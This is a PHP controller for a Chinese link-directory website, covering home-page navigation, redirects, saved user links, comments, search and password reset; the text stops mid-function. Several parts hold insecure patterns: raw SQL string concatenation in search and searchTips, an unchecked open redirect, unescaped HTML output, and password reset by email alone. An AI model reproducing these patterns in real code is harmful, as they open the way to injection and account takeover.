<?php
/**
 * @name IndexAction
 * @desc 首页
 * @package Home
 * @version 1.0
 * @author frank UPDATE 2013-08-16
 */
import("@.Common.CommonAction");
class IndexAction extends CommonAction {
	
	/**
	 * @desc 新首页
	 * @author slate date: 2013-08-20
	 */
	public function index() {
		import("@.ORG.String");
	
		// 公告
		$variable = M("Variable");
		$ann_name = $variable->getByVname('ann_name');
	
		$announce = M("Announcement");
		$announces = $announce->where('status = 1')->order('sort ASC, create_time DESC')->select();
	
		// 我的地盘
		$myarea = M("Myarea");
		session('arealist_default', $myarea->where('mid=0')->order('sort ASC')->select());
		//存在用户登录，获取用户的我的地盘
		$memberAuthKey = $this->_session(C('MEMBER_AUTH_KEY'));
	
		if (!empty($memberAuthKey)) {
			$areaList = $myarea->where('mid=' . $memberAuthKey)->order('sort ASC')->select();
			!empty($areaList) || $areaList = session('arealist_default');
			session('arealist', $areaList);
		} else {
			$areaList = $this->_session('arealist');
			!empty($areaList) || session('arealist', session('arealist_default'));
		}
		$this->assign('ann_name', $ann_name['value_varchar']);
		$this->assign("announces", $announces);
	
		$this->getHeaderInfo();
		$this->display('new_index');
	}
	
	/**
	 * @desc 旧首页（导航）
	 * @author Frank UPDATE 2013-08-16
	 * @see IndexAction::index()
	 */
	public function nav() {
		$cat = M("Category");
		import("@.ORG.String");
		
		$cid = intval($this->_param('cid')) ? intval($this->_param('cid')) : $cat->where('status=1 and level=1')->min('id');
		$lan = intval($this->_param('lan')) ? intval($this->_param('lan')) : (session('lanNow') ? session('lanNow') : 1);
		
		$grade = intval($this->_param('grade'));
		$sort = $this->_param('sort');
		
		if ($lan != session('lanNow')) {
			session('lanNow', $lan);
		}
		
		$rid = $this->getRoot($cid);
		$catName = $cat->where("id = '%d'", $cid)->getField('cat_name'); 
		$ridTip = $cat->where("id = '%d'", $rid)->getField('intro');
		
		$gradeArr = getGradeArr($rid);
		$this->getLeftMenu($rid);
		
		$condition['status'] = 1;
		$condition['category'] = $cid == $rid ? array('in', $this->_getSubCats($cid)) : $cid;
		$condition['language'] = $lan;
		if ($grade) {
			$condition['grade'] = array('like', '%' . $grade . '%');
			$this->assign("grade", $grade);
		}
		if (empty($sort)) {
			$sort = "csort ASC,sort ASC";
		}
		$memberAuthKey = intval($this->_session(C('MEMBER_AUTH_KEY')));
		$paiLie = $this->_session('pailie');
		
		if (empty($paiLie)) {
			$paiLie = empty($memberAuthKey) ? M("Variable")->where("vname='pailie'")->getField("value_int") : M("Member")->where("id = '%s'", $memberAuthKey)->getField('pailie');
			session('pailie', $paiLie);
		}
		$listRows = $paiLie == 1 ? 20 : 11;
		$pg = intval($this->_param(C('VAR_PAGE'))) ? intval($this->_param(C('VAR_PAGE'))) : 1;
		$rst = ($pg - 1) * $listRows;
		
		$links = new LinksFntViewModel();
		$list = $links->getLists($condition, $sort, $rst, $listRows, $rid, $gradeArr['aryGrade']);
		
		$this->assign('links', $list);
		$array_bq = array("dl", "div");
		
		$count = $links->where($condition)->count('links.id');
		if ($count > 0) {
			import("@.ORG.Page");
			$p = new Page($count, $listRows);
			$page = $p->show_ajax_js();
			$this->assign("page", $page);
		}
		// 公告
		$variable = M("Variable");
		$ann_name = $variable->getByVname('ann_name');
		
		$announce = M("Announcement");
		$announces = $announce->where('status = 1')->order('sort ASC, create_time DESC')->select();
		
		// 我的地盘
		$myarea = M("Myarea");
		session('arealist_default', $myarea->where('mid = 0')->order('sort ASC')->select());
		//存在用户登录，获取用户的我的地盘
		
		if ($memberAuthKey) {
			$areaList = $myarea->where("mid = '%d'", $memberAuthKey)->order('sort ASC')->select();
			empty($areaList) && $areaList = session('arealist_default');
			session('arealist', $areaList);
		} else {
			$areaList = $this->_session('arealist');
			empty($areaList) && session('arealist', session('arealist_default'));
		}
		// 目录图片
		$catPics = $this->getCatPics($rid);
		
		$this->assign("lan", $lan);
		$this->assign("sort", $sort);
		$this->assign('p', $pg);
		$this->assign("bq", $array_bq[rand(0,1)]);
		$this->assign('ann_name', $ann_name['value_varchar']);
		$this->assign("announces", $announces);
		$this->assign('catPics', $catPics['catPics']);
		$this->assign('pauseTime', $catPics['pauseTime']);
		$this->assign("cid", $cid);
		$this->assign("cat_name", $catName);
		$this->assign("rid", $rid);
		$this->assign('rid_tip', $ridTip);
		$this->assign('grades', $gradeArr['grades']);
		
		$this->getHeaderInfo();
		$this->display('index');
	}

	/**
	 * @name directUrl
	 * @desc 直达网址
	 * @param string tag
	 * @author Frank UPDATE 2013-08-17
	 */
	public function directUrl() {
		$model = M("DirectLinks");
		$condition['status'] = 1;
		$tag = cleanParam($this->_param('tag'));
		$tag = str_replace('。', '.', $tag);
		$len = strlen($tag);
		if ((strpos($tag, '网') == ($len - 3)) && $len > 6) {
			$tag = substr($tag, 0, $len - 3);
		}
		$condition['tag'] = $tag;
		$linkNow = $model->where($condition)->find();
		if ($linkNow) {
			$model->where("id={$linkNow['id']}")->setInc("click_num");
			echo '<style type="text/css">a{display:none}</style>
				  <script src="http://s96.cnzz.com/stat.php?id=4907803&web_id=4907803" language="JavaScript"></script>
				  <script type="text/javascript">window.location.href="http://' . $linkNow['url'] . '";
				  </script>';
		} else {
			$data['tag'] = $condition['tag'];
			$data['update_time'] = time();
			$model->add($data);
			$this->display('../Public/directUrl');
		}
	}

	/**
	 * @desc 连接导向
	 * @name link_out
	 * @param string mod
	 * @param string url
	 * @author Frank UPDATE 2013-08-17
	 */
	public function link_out() {
		$url = $this->_param('url');
		$mod = $this->_param('mod');
	
		if (empty($url)) {
			$this->error("对不起，链接不存在！");
		}
		$flag = 0;
		if ($mod == "myarea") {
			$mid = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
			$myarea = D("Myarea");
			$flag = $myarea->where("mid = '%d' and url = '%s'", $mid, $url)->setInc("click_num");
		} else {
			$linkModel = D("Links");
			$flag = $linkModel->where("link = '%s'", $url)->setInc("click_num");
		}
		
		echo '<style type="text/css">a{display:none}</style>
				<script src="http://s96.cnzz.com/stat.php?id=4907803&web_id=4907803" language="JavaScript"></script>
				<script type="text/javascript">window.location.href="' . (strpos ($url, 'http://')===FALSE && strpos ($url, 'https://')===FALSE ? 'http://' . $url : $url) . '";</script>';
		/*
		$check_url = $_SERVER['HTTP_REFERER'];
		if ($check_url != '') {
			$check_url = parse_url($check_url);
			if ($check_url['host'] == 'test.links123.net' || $check_url['host'] == 'www.links123.cn') {
				
			}
		}
		*/
	}
	
	/**
	 * @name updateArealist
	 * @desc 更新我的地盘
	 * @param string url
	 * @param string web_name
	 * @param int id
	 * @author Frank UPDATE 2013-08-20
	 */
	public function updateArealist() {
		
		$url = $this->_param('url');
		$webname = $this->_param('web_name');
		$id = $this->_param('id');
		
		foreach ($_SESSION['arealist'] as $key => $value) {
			if ($id == $value['id']) {
				$_SESSION['arealist'][$key]['url'] = $url;
				$_SESSION['arealist'][$key]['web_name'] = $webname;
			}
		}
		
		$user_id = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
		
		$result = true;
		$reason = "updateOK";
		
		if ($user_id) {
			$myarea = M("Myarea");
			$list = $myarea->where("mid = '%d'", $user_id)->order('sort')->select();	
			$myarea->startTrans();
			
			$now = time();
			$data['mid'] = $user_id;
			$data['create_time'] = $now;
			if (empty($list)) {
				foreach ($_SESSION['arealist'] as $value) {
					$data['web_name'] = $value['web_name'];
					$data['url'] = $value['url'];
					if (false === $myarea->add($data)) {
						$result = false;
						Log::write('新增我的地盘失败：' . $myarea->getLastSql(), Log::SQL);
						$reason = '新增我的地盘失败！';
					}
				}
			} else {
					
				$saveData = array(
						'url' => $url,
						'web_name' => $webname,
						'create_time' => $now
				);
				
				if (false === $myarea->where(array('id' => $id, 'mid' => $user_id))->save($saveData)) {
					$result = false;
					Log::write('更新我的地盘失败：' . $myarea->getLastSql(), Log::SQL);
					$reason = '保存我的地盘失败！';
				}
			}
			
			if ($result) {
				$myarea->commit();
			} else {
				$myarea->rollback();
			}
		}
		
		echo $reason;
	}
	/**
	 * @name sortArealist
	 * @desc 拖动我的地盘进行排序
	 * @param string area
	 * @author Frank UPDATE 2013-08-20
	 */
	public function sortArealist() {
		if ($this->isAjax()) {
			$area_list = $this->_post('area');
			$sort = 1;
			foreach ($area_list as $value) {
				foreach ($_SESSION['arealist'] as $val) {
					if ($val['id'] == intval($value)) {
						$val['sort'] = $sort;
						$new_area_list[] = $val;
						$sort++;
					}
				}
			}
			$_SESSION['arealist'] = $new_area_list;
			
			$user_id = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
			if ($user_id) {
				
				$myarea = M("Myarea");
				$list = $myarea->where("mid = '%d'", $user_id)->order('id')->select();
				$myarea->startTrans();
				$result = true;
				$reason = "未知";
				
				$now = time();
				$data['mid'] = $user_id;
				$data['create_time'] = $now;
				if (empty($list)) {
					foreach ($_SESSION['arealist'] as $value) {
						$data['web_name'] = $value['web_name'];
						$data['url'] = $value['url'];
						$data['sort'] = $value['sort'];
						if (false === $myarea->add($data)) {
							$result = false;
							Log::write('新增我的地盘失败：' . $myarea->getLastSql(), Log::SQL);
							$reason = '新增我的地盘失败！';
						}
					}
				} else {
					foreach ($_SESSION['arealist'] as $key => $value) {
						Log::write('session：sort_myarea ' . $_SESSION['arealist'][$key]['web_name'] . ';sort:' . $_SESSION['arealist'][$key]['sort'], Log::SQL);
						if (false === $myarea->save($value)) {
							$result = false;
							Log::write('更新我的地盘失败：' . $myarea->getLastSql(), Log::SQL);
							$reason = '更新我的地盘失败！';
						}
					}
				}
				
				if ($result) {
					$myarea->commit();
					die(json_encode(array('status' => 'ok', 'data' => $_SESSION['arealist'])));
				} else {
					$myarea->rollback();
					echo $reason;
				}
			} else {
				die(json_encode(array('status' => 'ok', 'data' => $_SESSION['arealist'])));
			}
		}
	}
	
	/**
	 * @name getArealistDefault
	 * @desc 获取默认我的底盘
	 * @author Frank UPDATE 2013-08-20
	 */
	public function getArealistDefault() {
		$_SESSION['arealist'] = $_SESSION['arealist_default'];
		$arealist_default1 = $arealist_default2 = '';
		foreach ($_SESSION['arealist_default'] as $value) {
			$arealist_default1 .= "<li title='拖动排序' url='" . $value['url'] . "' id='area_" . $value['id'] . "' mid='" . $value['id'] . "'>" . $value['web_name'] . "</li>";
			$arealist_default2 .= "<li><a href='http://" . $value['url'] . "' target='_blank' myid='" . $value['id'] . "'>" . $value['web_name'] . "</a></li>";
		}
		echo "getOK|" . $arealist_default1 . "|" . $arealist_default2;
	}
	
	/**
	 * @name detail
	 * @desc 详细介绍
	 * @author Frank UPDATE 2013-08-20
	 */
	public function detail() {
		import("@.ORG.String");
		import("@.ORG.VideoHooks");
		
		$id = intval($this->_get('id'));
		if (empty($id)) {
			$this->redirect(__URL__);
		}
		
		$links = M("Links");
		$linkNow = $links->getById($id);
		$this->assign("linkTitle", $linkNow['title']);
		
		$GLOBALS['_title'] = $linkNow['title'];
		$linkNow['intro'] = nl2br($linkNow['intro']);
		$linkNow["intro"] = checkLinkUrl($linkNow["intro"]);
		// 防采集
		$array_bq = array("span", "font", "b", "strong", "div", "em");
		$array_class = array("cprt", "lnkcpt", "cpit", "lnkcpit", "fjc", "lnkfcj");
		$idx1 = String::randNumber(0, 5);
		$idx2 = String::randNumber(0, 5);
		$this->assign("bq1", $array_bq[$idx1]);
		$this->assign("bq2", $array_bq[$idx2]);
		$rdm = String::uuid();
		$tempstr = "<" . $array_bq[$idx1] . " class='" . $array_class[$idx2] . "'>欢迎来到另客网，" . $rdm . "近一点，更近一点" . $rdm . "</" . $array_bq[$idx1] . ">";
		$linkNow["title"] = $linkNow["title"] . $tempstr;
		$linkNow["intro"] = $linkNow["intro"] . $tempstr;
		
		if (!empty($linkNow['mid'])) {
			$linkNow['nickname'] = M("Member")->where("id = '%d'", $linkNow['mid'])->getField('nickname');
		}
		
		$cid = $linkNow['category'];
		$this->assign("cid", $cid);
		
		$GLOBALS['_description'] = strlen($linkNow['intro']) > 100 ? String::msubstr($linkNow['intro'], 0, 100) : $linkNow['intro'];
		$this->SEOTitle($cid);

		$rid = $this->getRoot($cid);
		$this->assign("rid", $rid);
		
		$this->assign("lan", $linkNow['language']);
		$this->getLeftMenu($rid);
		
		$listRows = 12;
		$p = $this->_get(C('VAR_PAGE'));
		$pg = $p ? $p : 1;
		$rst = ($pg - 1) * $listRows;
		
		$condition['lnk_id'] = $id;
		$comment = new CommentViewModel();
		$cmtList = $comment->where($condition)->order('create_time DESC')->limit($rst . ',' . $listRows)->select();
		foreach ($cmtList as &$value) {
			$value['create_time'] = date('Y-m-d H:i', $value['create_time']);
			empty($value['nickname']) && $value['nickname'] = "游客";
			empty($value['face']) && $value['face'] = "face.jpg";
		}
		
		$this->assign('cmtList', $cmtList);
		
		$count = $comment->where($condition)->count('id');
		if ($count > 0) {
			import("@.ORG.Page");
			$p = new Page($count, $listRows);
			$page = $p->show_js();
			$this->assign("page", $page);
		}
		
		$catPics = $this->getCatPics($rid);
		$this->assign('catPics', $catPics['catPics']);
		$this->assign('pauseTime', $catPics['pauseTime']);

		//英文岛TED视频虚拟本地播放
		if ($linkNow['language'] == 2 && !$linkNow['link_ted']) {
			$videoHooks = new VideoHooks();
			$videoInfo = $videoHooks->analyzer($linkNow['link']);
		}

		//中文岛TED视频虚拟本地播放: 地址未解析，则自动进行解析
		if (!$linkNow['link_cn']) {
			$videoHooks = new VideoHooks();
			//英文岛TED视频使用TED link资源
			if ($linkNow['language'] == 2 && strpos($linkNow['intro'], '（需翻墙') === FALSE) {
				$link = $linkNow['link'];
			} else {
				$link = str_replace('\'', '', $videoHooks->match('/http:(.+?)\s/', $linkNow['intro'], 0));
			}

			$videoInfo = $videoHooks->analyzer($link);
			$link_cn = $videoInfo['swf'];

			//英文岛TED视频如果需要翻墙，则采用国内资源
			if ($linkNow['language'] == 2 && !$link_cn) {
				$link = str_replace('\'', '', $videoHooks->match('/http:(.+?)\s/', $linkNow['intro'], 0));
				$videoInfo = $videoHooks->analyzer($link);
				$link_cn = $videoInfo['swf'];
			}

			if (!$videoHooks->getError()) {
				$links->where('id=' . $linkNow['id'])->save(array('link_cn' => $link_cn, 'link_cn_img' => $videoInfo['img']));
			}
			$linkNow['link_cn'] = $link_cn;
		}

		$linkNow['isTed'] = strpos($linkNow['link_cn'], 'ted.com') !== FALSE ? 1 : 0;

		$this->assign('linkNow', $linkNow);

		//session防垃圾和时间设置 如果提交了评论
		if (preg_match("#saveComment#i", $_SERVER['HTTP_REFERER'])){
			//下一次提交评论的最小时间戳(时间戳 +两次评论的最小间隔时间)
			$this->timestamp = $_SESSION['timestamp']= time()+D("WebSettings")->getwebSettings("COMMENT_BETWEEN_TIME") ;
		}
		//随机的评论框名称
		$this->comment = $_SESSION['comment'] = 'comment'.rand(1000, 9999);
		$this->display();
	}

	/**
	 * @name ann_detail
	 * @desc 公告明细
	 * @param id
	 * @author Frank UPDATE 2013-08-20
	 */
	public function ann_detail() {
		$id = intval($this->_param('id'));
		$announce = M("Announcement");
		$annNow = $announce->getById($id);
		$announce->where("id = '%d'", $id)->setInc("click_num");
		$annNow['create_time'] = date('Y-m-d H:i', $annNow['create_time']);
		$annNow['content'] = nl2br($annNow['content']);
		$annNow["content"] = checkLinkUrl($annNow["content"]);
		$this->assign("annNow", $annNow);
		
		$this->display();
	}

	/**
	 * @name setPailie
	 * @desc 设置排列
	 * @param string val
	 * @return boolean
	 * @author Frank UPDATE 2013-08-20
	 */
	public function setPailie() {
		$val = intval($this->_param('val'));
		if (empty($val)) {
			echo "排列值丢失！";
			return false;
		}
		$_SESSION['pailie'] = $val;
		$mid = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
		if ($mid) {
			$member = M("Member");
			if (false === $member->where("id = '%d'", $mid)->setField('pailie', $val)) {
				Log::write('设置排列失败：' . $member->getLastSql(), Log::SQL);
				echo "设置排列失败";
				return false;
			}
		}
		echo "setOK";
	}

	/**
	 * @name ding
	 * @desc 顶
	 * @param id
	 * @return boolean
	 * @author Frank UPDATE 2013-08-20
	 */
	public function ding() {
		$id = intval($this->_param('id'));
		if (empty($id)) {
			echo "链接编号丢失！";
			return false;
		}
		
		$links = M("Links");
		if ($links->where("id = '%d'", $id)->setInc('ding')) {
			echo "dingOK";
		} else {
			Log::write('顶失败：' . $links->getLastSql(), Log::SQL);
		}
	}

	/**
	 * @name cai
	 * @desc 踩
	 * @param id
	 * @return boolean
	 * @author Frank UPDATE 2013-08-20
	 */
	public function cai() {
		$id = intval($this->_param('id'));
		if (empty($id)) {
			echo "链接编号丢失！";
			return false;
		}
		
		$links = M("Links");
		if ($links->where("id = '%d'", $id)->setInc('cai')) {
			echo "caiOK";
		} else {
			Log::write('踩失败：' . $links->getLastSql(), Log::SQL);
		}
	}

	/**
	 * @name verify
	 * @desc 验证码
	 * @param type
	 * @author Frank UPDATE 2013-08-20
	 */
	public function verify() {
		$type = $this->_param('type') != '' ? $this->_param('type') : 'gif';
		import("@.ORG.Image");
		Image::buildImageVerify(3, 5, $type, 48, 28);
	}

	// 忘记密码
	public function missPwd() {
		$email = $_POST['email'];
		if (empty($email)) {
			echo "邮箱丢失！";
			return false;
		}
		//
		$mbr = M("Member");
		$mbrNow = $mbr->getByEmail($email);
		if ($mbrNow) {
			import("@.ORG.String");
			$password = String::randString();
			if (false !== $mbr->where('id=' . $mbrNow['id'])->setField('password', md5(md5($password) . $mbrNow['salt']))) {
				$mail = array();
				$mail['mailto'] = $email;
				$mail['title'] = "[另客网]忘记密码";
				$mail['content'] = "您好，您的新密码是：" . $password . "<br /><br />为了您的账户安全，请登录后尽快修改您的密码，谢谢！<br /><br />--------------------<br /><br />（这是一封自动发送的邮件，请不要直接回复）";
				if (sendMail($mail)) {
					$mailserver = 'mail.' . substr($email, strpos($email, '@') + 1);
					$mailserver = strtolower($mailserver);
					$mailserver = str_replace('gmail', 'google', $mailserver);
					$mailserver = str_replace('mail.hotmail.com', 'www.hotmail.com', $mailserver);
					echo "sendOK|" . $mailserver;
				} else {
					echo "发送新密码失败！";
				}
			}
		} else {
			echo "未发现您输入的邮箱！";
		}
	}
	/**
	 * @name saveComment
	 * @desc 保存说说
	 * @param int lnk_id
	 * @param string comment
	 * @param string ip
	 * @author Frank UPDATE 2013-08-19
	 */
	public function saveComment() {
		if ($this->isAjax()) {
			$lnk_id = $this->_param('lnk_id');
			if (empty($lnk_id)) {
				$this->ajaxReturn("unllid", "", false);
				exit;
			}
			
			$commentData = stripslashes($_REQUEST['comment']);
			if (empty($commentData)){
				exit;
			}
			
			//过滤非法关健字
			//$commentData = filterIllegal($commentData);
			$condition['comment'] = $commentData;
			$condition['ip'] = getIP();
			$condition['lnk_id'] = $lnk_id;
			
			$Comment = M("Comment");
			$commentnum = $Comment->where($condition)->count();
			if($commentnum >= 1) {
				$this->ajaxReturn("isset", "", false);
				exit;
			}
			//1天同一ip只能发3次
			$daystart = strtotime(date("Y-m-d", time()).' 00:00:00');
			$dayend = strtotime(date("Y-m-d", time()).' 23:59:59');
			
			$commentmax = $Comment->where("lnk_id = '%d' AND ip = '%s' AND create_time > '%s' AND create_time < '%s'", $lnk_id, $condition['ip'], $daystart, $dayend)->count();
			if ($commentmax >= 3) {
				$this->ajaxReturn("maxflag", "", false);
				exit;
			}
			
			$data['lnk_id'] = $lnk_id;
			$data['mid'] = $_SESSION[C('MEMBER_AUTH_KEY')];
			$data['comment'] = $commentData;
			$data['ip'] = getIP();
			$data['create_time'] = time();
			
			if ($Comment->add($data)) {
				$links = M("Links");
				if (false === $links->where("id = '%d'", $data['lnk_id'])->setInc('say_num')) {
					Log::write('增加链接说说数量失败：' . $links->getLastSql(), Log::SQL);
				}
			} else {
				Log::write('说说提交失败：' . $Comment->getLastSql(), Log::SQL);
			}
			
			$this->ajaxReturn("success", "", true);
		}
	}
	
	/**
	 * @name search
	 * @desc 搜索
	 * @author Frank UPDATE 2013-08-20
	 */
	public function search() {
		import("@.ORG.String");
		$category = M("Category");
		
		$condition['status'] = 1;
		
		$memberAuthKey = intval($this->_session(C('MEMBER_AUTH_KEY')));
		$paiLie = $this->_session('pailie');
		if (empty($paiLie)) {
			$paiLie = empty($memberAuthKey) ? M("Variable")->where("vname='pailie'")->getField("value_int") : M("Member")->where("id = '%s'", $memberAuthKey)->getField('pailie');
			session('pailie', $paiLie);
		}
		
		$lan = intval($this->_param('lan'));
		if (!empty($lan)) {
			$condition['language'] = $lan;
			$this->assign('lan', $lan);
		}
		
		$cid = intval($this->_param('cid'));
		if (!empty($cid)) {
			$condition['category'] = $cid;
			$this->assign('cid', $cid);
		}
		
		$keyword = cleanParam($this->_param('q'));
		if (!empty($keyword)) {
			$condition['_string'] = "title like '%" . $keyword . "%' or tags like '%" . $keyword . "%' or link like '%" . $keyword . "%' or intro like '%" . $keyword . "%'";
		}
		$this->assign("keyword", $keyword);
		
		$listRows = $_SESSION['pailie'] == 1 ? 20 : 11;
		
		$pg = intval($this->_param(C('VAR_PAGE')));
		$pg = max(1, $pg);
		$rst = ($pg - 1) * $listRows;
		
		$links = M("Links");
		$list = $links->where($condition)->select();
		
		$model = new Model();
		if (isset($_SESSION[C('MEMBER_AUTH_KEY')]) && !empty($_SESSION[C('MEMBER_AUTH_KEY')])) {
			$sql = "select web_name as title, url as link, 'myarea.jpg' as logo, '我的地盘' as intro, '1' as notlink from lnk_myarea where (mid=0 or mid=" . $_SESSION[C('MEMBER_AUTH_KEY')] . ") and (web_name like '%" . $keyword . "%' or url like '%" . $keyword . "%')";
		} else {
			$sql = "select web_name as title, url as link, 'myarea.jpg' as logo, '我的地盘' as intro, '1' as notlink from lnk_myarea where mid=0 and (web_name like '%" . $keyword . "%' or url like '%" . $keyword . "%')";
		}
		
		$dpList = $model->query($sql);
		if (!empty($dpList)) {
			$list = array_merge($list, $dpList);
		}
		
		$lybList = $model->query("select '留言板' as title, 'www.links123.cn/Index/suggestion' as link, 'lyb.jpg' as logo, suggest as intro, '1' as notlink from lnk_suggestion where status>=0 and suggest like '%" . $keyword . "%'");
		if (!empty($lybList)) {
			$list = array_merge($list, $lybList);
		}
		
		$sayList = $model->query("select '说说' as title, CONCAT('www.links123.cn/Index/detail/id/',lnk_id) as link, 'say.jpg' as logo, comment as intro, '1' as notlink from lnk_comment a inner join lnk_links b on a.lnk_id=b.id where comment like '%" . $keyword . "%'");
		if (!empty($sayList)) {
			$list = array_merge($list, $sayList);
		}
		
		$aimList = array();
		for ($i = 0; $i != $listRows; ++$i) {
			if (!empty($list[$i + $rst])) {
				array_push($aimList, $list[$i + $rst]);
			}
		}
		
		foreach ($aimList as &$value) {
			if (empty($value['notlink'])) {
				$value["more"] = 0;
				if (empty($value["logo"])) {
					if ($_SESSION['pailie'] == 1) {
						$value["sintro"] = String::msubstr($value["intro"], 0, 19);
					} else {
						$value["sintro"] = String::msubstr($value["intro"], 0, 208);
						if ($value["sintro"] != $value["intro"]) {
							$value["sintro"] = String::msubstr($value["intro"], 0, 150);
							$value["more"] = 1;
						}
					}
				} else {
					if ($_SESSION['pailie'] == 1) {
						$value["sintro"] = String::msubstr($value["intro"], 0, 13);
					} else {
						$value["sintro"] = String::msubstr($value["intro"], 0, 184);
						if ($value["sintro"] != $value["intro"]) {
							$value["sintro"] = String::msubstr($value["intro"], 0, 132);
							$value["more"] = 1;
						}
					}
				}
				if ($_SESSION['pailie'] == 2) {
					$value["sintro"] = nl2br($value["sintro"]);
					$value["sintro"] = str_replace("<br /><br />", "", $value["sintro"]); // 特意写成这样的
					$value["sintro"] = str_replace("<br /><br />", "", $value["sintro"]); // 特意写成这样的
					$tempary = explode("<br />", $value["sintro"]);
					if (count($tempary) > 4) {
						$lastline = String::msubstr($tempary[2], 0, 40);
						if ($lastline == $tempary[2]) {
							$lastline .= "…";
						}
						$value["sintro"] = $tempary[0] . "<br />" . $tempary[1] . "<br />" . $lastline;
						$value["more"] = 1;
					}
					if (count($tempary) == 3 || (count($tempary) == 4 && $value["more"] == 1)) {
						$lastline = String::msubstr($tempary[2], 0, 40);
						$value["sintro"] = $tempary[0] . "<br />" . $tempary[1] . "<br />" . $lastline;
						if (count($tempary) == 4) {
							$value["sintro"] .= "…";
						}
					}
					if (count($tempary) == 2) {
						if ($value["more"] == 1) {
							if (strlen($tempary[1]) < strlen($tempary[0])) {
								$lastline = String::msubstr($tempary[1], 0, 40);
								$value["sintro"] = $tempary[0] . "<br />" . $lastline;
							}
						} else {
							$value["sintro"] = $tempary[0] . "<br />" . $tempary[1];
						}
					}
					$value["sintro"] = checkLinkUrl($value["sintro"]);
				}
				
				if (!empty($value['mid'])) {
					$value['nickname'] = M("Member")->where('id=' . $value['mid'])->getField('nickname');
				}
			
				$cat = $category->getById($value['category']);
				$root = $category->getById($cat['prt_id']);
				$value['title'] = $value['title'] . "【" . $root['cat_name'] . "-" . $cat['cat_name'] . "】";
				
				//取出prt_id，当prt_id=5即当前结果为TED，连接修改为本地播放
				$value['prt_id'] = $cat['prt_id'];
			} else {
				$value["sintro"] = String::msubstr($value["intro"], 0, 240);
			}
		}
		$this->assign('links', $aimList);

		// 分页
		$count = count($list);
		if ($count == 0) {
			$this->redirect("category");
		}
		if ($count > 0) {
			import("@.ORG.Page");
			$p = new Page($count, $listRows);
			$page = $p->show();
			$this->assign("page", $page);
		}
		
		$this->assign('banner', $this->getAdvs(6, "banner"));
		$this->assign('thlNow', $this->_param('thl'));
		$this->assign('tidNow', $this->_param('tid'));
		$this->assign('title', '另客汇集最有影响力的搜索引擎，让你输入一次，搜遍网络！');
		$this->assign('Description', '另客独有的搜索引擎汇集给您带来特有的搜索体验。你不用离开另客就能很方便地使用众多最有影响力的搜索引擎。另客本身丰富的数据也是你寻找教育资源最好的搜索引擎。网友的分享和交流更可能让你获得意想不到的信息');
		
		$this->display();
	}

	/**
	 * @name category
	 * @desc 获取分类
	 * @param int lan
	 * @param int rid
	 * @author Frank UPDATE 2013-08-20
	 */
	public function category() {
		$language = $this->_param('lan');
		$rid = $this->_param('rid');
		
		$this->assign('language', $language);
		$this->getMyCats($language);
		$this->assign('rid', $rid);
		$this->assign('tidNow', 10);
		$this->assign('banner', $this->getAdvs(6, "banner"));
		
		$this->display();
	}
	
	/**
	 * @name SEOTitle
	 * @desc 设置seo头信息
	 * @param int $catid
	 * @author Frank UPDATE 2013-08-20
	 */
	public function SEOTitle($catid) {
		//default title	
		$cid = intval($this->_param('cid'));
		$variable = M("Variable");
		$title = $variable->getByVname('title');
		//current category
		$cat = M("Category");
		if ($cid) {
			$_SESSION['catNow'] && $_SESSION['catNow'] = null;
			$_SESSION['catNow'] = $cat->getById($cid);
		} else if (!$_SESSION['catNow'] || $_SERVER['REQUEST_URI'] == '/') {
			$cid = $cat->where('status=1 and level=1')->min('id');
			$_SESSION['catNow'] = $cat->getById($cid);
		}
		
		if ($catid) {
			$_SESSION['catNow'] = $cat->getById($catid);
			$_title = $GLOBALS['_title'] . ' | ' . $_SESSION['catNow']['cat_name'] . ' | 另客网';
		} else {
			$_firstTiles3 = $GLOBALS['firstTiles3'][0] . ($GLOBALS['firstTiles3'][1] ? '、' . $GLOBALS['firstTiles3'][1] . ($GLOBALS['firstTiles3'][2] ? '、' . $GLOBALS['firstTiles3'][2] : '') : '');
			import("@.ORG.Page");
			$p = new Page();
			if ($p->getCurrentPage() > 1) {
				$_title = $title['value_varchar'] . ' - ' . $_SESSION['catNow']['cat_name'] . ' 第' . $p->getCurrentPage() . '页';
			} else {
				$_title = $title['value_varchar'] . ' - ' . $_SESSION['catNow']['cat_name'];
			}
			
			$Description = $variable->getByVname('Description');
			$GLOBALS['_description'] = $Description['value_varchar'] . '。本页热门网站有：' . $_firstTiles3;
		}
		$this->assign('title', $_title);
		$this->assign('Description', strip_tags(str_replace("\n","",$GLOBALS['_description'])));
	}

	/**
	 * @name searchTips
	 * @param string search_text
	 * @author Frank UPDATE 2013-08-20
	 */
	public function searchTips() {
		$stext = trim($this->_param('search_text'));
		$sbmt = $this->_param('sbmt');
		$model = M('SearchTip');
		$condition = array();
		$condition['tip_content'] = array('like',  $stext. '%');
		$tips = $model->where($condition)->select();
		if (count($tips) > 0) {
			$tiplist = '<li style="height:1px; width:1px; z-index:-1; position:relative"><input type="text" id="li0" style="height:1px" size="1" /></li>';
			for ($i = 0; $i < count($tips); $i++) {
				$tiplist .= '<li style="background:#fff"><input type="text" readonly id="li' . ($i + 1) . '" style="border:none; padding:0 0 0 4px; width:351px;cursor:pointer;z-index:' . ($i + 1) . '" value=' . $tips[$i]['tip_content'] . ' class="valid" /></li>';
			}
			echo $tiplist;
		} else {
			echo - 1;
		}
		if ($sbmt) {
			$condition['tip_content'] = array('=', '"' . $stext . '"');
			$tips = $model->where($condition)->select();
			if (count($tips) > 0) {
				$model->__set('tip_weight', 1 + $tips[0]['tip_weight']);
				$model->save();
			} else {
				$GLOBALS['_sql'] = 'insert into lnk_search_tip (tip_content) values ("' . trim($_REQUEST['search_text']) . '")';
				$model->add();
			}
		}
	}

	
	
	/**
	 * @desc 统计用户自留地按钮点击统计
	 * @author Frank UPDATE 2013-08-17
	 */
	public function count_myarea_open() {
		if ($this->isAjax()) {
			$mid = intval($_SESSION[C('MEMBER_AUTH_KEY')]);
			$myareaModel = D("Myarea");
			$myareaModel->where("mid='%d'", $mid)->setInc("myarea_button_click_num");
			exit(0);
		}
	}

	/**
	 * @desc 统计英语角按钮点击统计
	 * @author Frank UPDATE 2013-08-17
	 */
	public function count_english_open() {
		if ($this->isAjax()) {
			$variableModel = D("Variable");
			$num = intval($variableModel->getVariable("english_click_num")) + 1;
			$variableModel->setVariable("english_click_num", $num, "英语角按钮点击次数");
			exit(0);
		}
	}
	/**
	 * @desc ajax获取首页目录以及连接列表
	 * @author Frank UPDATE 2013-08-17
	 */
	public function ajax_get_links() {
		if ($this->isAjax()) {
